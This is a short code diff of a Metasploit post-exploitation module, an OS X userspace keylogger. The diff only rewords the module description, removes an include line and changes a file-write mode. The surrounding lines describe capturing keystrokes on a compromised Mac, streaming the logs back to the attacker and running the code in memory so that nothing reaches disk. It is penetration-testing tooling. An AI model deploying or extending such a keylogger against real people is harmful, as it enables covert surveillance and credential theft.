@@ -8,7 +8,6 @@
 require 'shellwords'
 
 class Metasploit3 < Msf::Post
-  include Msf::Post::Common
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
@@ -29,12 +28,12 @@ class Metasploit3 < Msf::Post
     super(update_info(info,
       'Name'          => 'OSX Capture Userspace Keylogger',
       'Description'   => %q{
-        This module logs all keyboard events except cmd-keys and GUI password input.
+        Logs all keyboard events except cmd-keys and GUI password input.
 
         Keylogs are transferred between client/server in chunks
         every SYNCWAIT seconds for reliability.
 
-        It works by calling the Carbon GetKeys() hook using the DL lib
+        Works by calling the Carbon GetKeys() hook using the DL lib
         in OSX's system Ruby. The Ruby code is executed in a shell
         command using -e, so the payload never hits the disk.
       },
@@ -113,7 +112,7 @@ class Metasploit3 < Msf::Post
                 "keylog", "text/plain", session, log, "keylog.log", "OSX keylog"
               )
             else
-              File.open(self.loot_path, 'ab') { |f| f.write(log) }
+              File.open(self.loot_path, 'a') { |f| f.write(log) }
             end
             print_status(log_a.map{ |a| a=~/([^\s]+)\s*$/; $1 }.join)
             print_status "Saved to #{self.loot_path}"
